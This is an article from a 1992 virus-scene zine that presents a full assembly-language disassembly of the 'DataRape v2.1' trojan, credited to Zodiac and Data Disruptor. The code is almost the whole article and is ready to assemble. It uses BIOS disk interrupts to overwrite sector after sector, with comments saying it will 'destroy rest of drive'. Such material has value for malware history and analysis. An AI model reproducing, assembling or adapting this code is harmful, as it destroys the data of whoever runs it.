ÄÄÄÄÄÄÄÄÄÍÍÍÍÍÍÍÍÍ>>> Article From Evolution #2 - YAM '92

Article Title: Data Rape v2.1 Trojan
Author: Admiral Bailey


;=---
;
; DataRape 2.1 Trojan
;
; Disassembled By Admiral Bailey [YAM '92]
; June 25, 1992
;
; The writers of this virus are Zodiac and Data Disruptor
;
; Notes:Just a regular trojan.  This one puts the messege into the
;       sector it writes.  Even though its not advanced it gets the
;       job done.
;
;=---------
seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a
                org     100h

datarap2  proc    far
start:
                jmp     begin
messege         db      '----------------------------',0Dh,0ah
                db      '         DataRape v2.1      ',0dh,0ah
                db      '    Written by Zodiac and   ',0dh,0ah
                db      '        Data Disruptor      ',0dh,0ah
copyright       db      '(c) 1991 RABID International',0dh,0ah
                db      '----------------------------',0dh,0ah

sector          db      1
data_3          db      0

begin:
                mov     ah,0Bh                  ; write sectors
                mov     al,45h                  ; sectors to write to
                mov     bx,offset messege       ; writes this messege
                mov     ch,0                    ; clear out these
                mov     cl,0
                mov     dh,0
                mov     dl,80h                  ; drive
                int     13h

                jnc     write_loop              ; nomatter what jump to
                jc      write_loop              ; the write loop and
                jmp     short write_loop        ; destroy rest of drive
                nop
compare:
                mov     sector,1                ; start writing at sec1
                inc     data_3
                jmp     short loc_4
                db      90h
write_loop:
                cmp     data_3,28h
                jae     quit
                cmp     sector,9
                ja      compare
loc_4:
                mov     ah,3                    ; write sec's from mem
                mov     al,9                    ; #
                mov     bx,offset messege       ; this is in mem
                mov     ch,data_3               ; cylinder
                mov     cl,sector               ; sector
                mov     dh,0                    ; drive head
                mov     dl,2                    ; drive
                int     13h

                inc     sector                  ; move up a sector
                jmp     short write_loop
                db       73h, 02h, 72h, 00h
quit:
                mov     ax,4C00h
                int     21h                     ; now quit

datarap2  endp

seg_a           ends

                end     start


